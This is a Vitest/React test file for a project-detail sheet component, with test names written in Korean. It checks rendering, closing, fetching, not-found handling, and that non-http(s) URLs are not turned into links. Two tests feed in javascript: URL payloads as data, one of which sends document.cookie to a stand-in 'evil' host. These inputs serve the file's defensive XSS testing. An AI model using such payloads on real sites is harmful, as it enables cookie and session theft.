import type { PublicProject } from '@repo/shared/types';
import {
  apiError,
  apiPath,
  apiSuccess,
  expectNoRequest,
  http,
  renderWithProviders,
  screen,
  server,
  within,
} from '@repo/test-utils';
import { describe, expect, it, vi } from 'vitest';

import ProjectDetailSheet from '.';

const publicProject: PublicProject = {
  id: 7,
  name: 'DataGSM',
  description: '학교 데이터 API',
  startYear: 2024,
  endYear: null,
  status: 'ACTIVE',
  iconUrl: null,
  deploymentUrl: 'https://datagsm.kr',
  club: null,
  participants: [{ name: '홍길동', major: 'SW_DEVELOPMENT' }],
  repositories: ['https://github.com/themoment-team/datagsm-client'],
  techStacks: ['Next.js'],
};

/** 상세 조회 응답을 정하고, 조회한 프로젝트 ID를 기록한다 */
const mockProjectDetail = (respond: () => Response) => {
  const requestedIds: number[] = [];
  server.use(
    http.get(apiPath('/v1/public/projects/:id'), ({ params }) => {
      requestedIds.push(Number(params.id));
      return respond();
    }),
  );
  return requestedIds;
};

const dialog = () => screen.getByRole('dialog');

describe('ProjectDetailSheet', () => {
  it('목록에서 받은 데이터를 조회 응답보다 먼저 보여 주고, 응답이 오면 최신 내용으로 바꾼다', async () => {
    mockProjectDetail(() => apiSuccess({ ...publicProject, description: '최신 설명' }));

    renderWithProviders(
      <ProjectDetailSheet projectId={7} initialProject={publicProject} onClose={() => {}} />,
    );

    // 응답을 기다리지 않고 첫 렌더부터 목록 데이터가 보인다.
    expect(within(dialog()).getByRole('heading', { name: 'DataGSM' })).toBeInTheDocument();
    expect(within(dialog()).getByText('학교 데이터 API')).toBeInTheDocument();
    expect(within(dialog()).getByRole('link', { name: '사이트 방문' })).toHaveAttribute(
      'href',
      'https://datagsm.kr',
    );

    expect(await within(dialog()).findByText('최신 설명')).toBeInTheDocument();
  });

  it('닫기 버튼을 누르면 onClose를 호출한다', async () => {
    mockProjectDetail(() => apiSuccess(publicProject));
    const onClose = vi.fn();
    const { user } = renderWithProviders(
      <ProjectDetailSheet projectId={7} initialProject={publicProject} onClose={onClose} />,
    );

    await user.click(within(dialog()).getByRole('button', { name: 'Close' }));

    expect(onClose).toHaveBeenCalledTimes(1);
  });

  it('목록 데이터가 없으면 상세를 조회해 보여 준다', async () => {
    const requestedIds = mockProjectDetail(() => apiSuccess(publicProject));

    renderWithProviders(<ProjectDetailSheet projectId={7} onClose={() => {}} />);

    expect(await within(dialog()).findByRole('heading', { name: 'DataGSM' })).toBeInTheDocument();
    expect(within(dialog()).getByText('소프트웨어개발과')).toBeInTheDocument();
    expect(requestedIds).toEqual([7]);
  });

  it('없는 프로젝트면 찾을 수 없다는 안내를 보여 준다', async () => {
    mockProjectDetail(() => apiError(404, 'Project not found'));

    renderWithProviders(<ProjectDetailSheet projectId={404} onClose={() => {}} />);

    expect(await within(dialog()).findByText('프로젝트를 찾을 수 없습니다.')).toBeInTheDocument();
  });

  it('http(s)가 아닌 배포 URL은 링크로 걸지 않는다', async () => {
    mockProjectDetail(() => apiSuccess({ ...publicProject, deploymentUrl: 'javascript:alert(1)' }));

    renderWithProviders(<ProjectDetailSheet projectId={7} onClose={() => {}} />);

    expect(await within(dialog()).findByRole('heading', { name: 'DataGSM' })).toBeInTheDocument();
    expect(within(dialog()).queryByRole('link', { name: '사이트 방문' })).not.toBeInTheDocument();
  });

  it('http(s)가 아닌 리포지토리는 링크로 걸지 않고 글자로만 보여 준다', async () => {
    const safeRepo = 'https://github.com/themoment-team/datagsm-client';
    const unsafeRepo = "javascript:fetch('//evil?'+document.cookie)";
    mockProjectDetail(() => apiSuccess({ ...publicProject, repositories: [safeRepo, unsafeRepo] }));

    renderWithProviders(<ProjectDetailSheet projectId={7} onClose={() => {}} />);

    expect(await within(dialog()).findByRole('link', { name: safeRepo })).toHaveAttribute(
      'href',
      safeRepo,
    );
    expect(within(dialog()).getByText(unsafeRepo).closest('a')).toBeNull();
    expect(within(dialog()).queryByRole('link', { name: unsafeRepo })).not.toBeInTheDocument();
  });

  it('projectId가 null이면 시트를 열지 않고 조회도 하지 않는다', async () => {
    const requestedIds = mockProjectDetail(() => apiSuccess(publicProject));

    renderWithProviders(<ProjectDetailSheet projectId={null} onClose={() => {}} />);

    expect(screen.queryByRole('dialog')).not.toBeInTheDocument();
    await expectNoRequest(() => requestedIds.length);
  });
});
